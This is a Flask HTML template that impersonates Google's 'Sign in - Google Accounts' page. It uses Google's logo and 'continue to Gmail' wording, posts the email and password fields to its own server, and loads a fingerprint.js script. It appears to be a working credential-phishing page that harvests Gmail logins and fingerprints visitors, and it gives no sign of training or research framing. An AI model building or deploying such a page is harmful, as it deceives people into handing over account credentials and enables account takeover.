<!DOCTYPE html>
<html>
  <head>
    <title>Sign in - Google Accounts</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="{{ url_for('static', filename='style.css') }}"
    />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <style>
      body {
        font-family: Arial, sans-serif;
        background: #f2f2f2;
      }
      .login-box {
        background: #fff;
        padding: 30px;
        margin: 100px auto;
        width: 350px;
        border-radius: 8px;
        box-shadow: 0 2px 8px #ccc;
      }
      input {
        width: 100%;
        padding: 10px;
        margin: 10px 0;
      }
      button {
        width: 100%;
        padding: 10px;
        background: #4285f4;
        color: #fff;
        border: none;
        border-radius: 4px;
      }
      .google-logo {
        display: block;
        margin: 0 auto 20px;
      }
      .login-form {
        margin-top: 10px;
      }
    </style>
  </head>
  <body>
    <div class="login-box">
      <img
        src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"
        alt="Google"
        class="google-logo"
      />
      <h2>Sign in</h2>
      <p>to continue to Gmail</p>
      <form method="post" class="login-form">
        <input
          type="email"
          name="email"
          placeholder="Email or phone"
          required
        />
        <input
          type="password"
          name="password"
          placeholder="Enter your password"
          required
        />
        <button type="submit">Next</button>
      </form>
      <p style="margin-top: 20px; font-size: 14px">
        <a href="#" style="color: #1a73e8; text-decoration: none"
          >Forgot email?</a
        >
      </p>
      <p style="margin-top: 40px; font-size: 14px; color: #5f6368">
        Not your computer? Use Guest mode to sign in privately.
      </p>
      <p style="margin-top: 20px; font-size: 14px">
        <a href="#" style="color: #1a73e8; text-decoration: none"
          >Create account</a
        >
      </p>
    </div>
    <script src="{{ url_for('static', filename='fingerprint.js') }}"></script>
  </body>
</html>
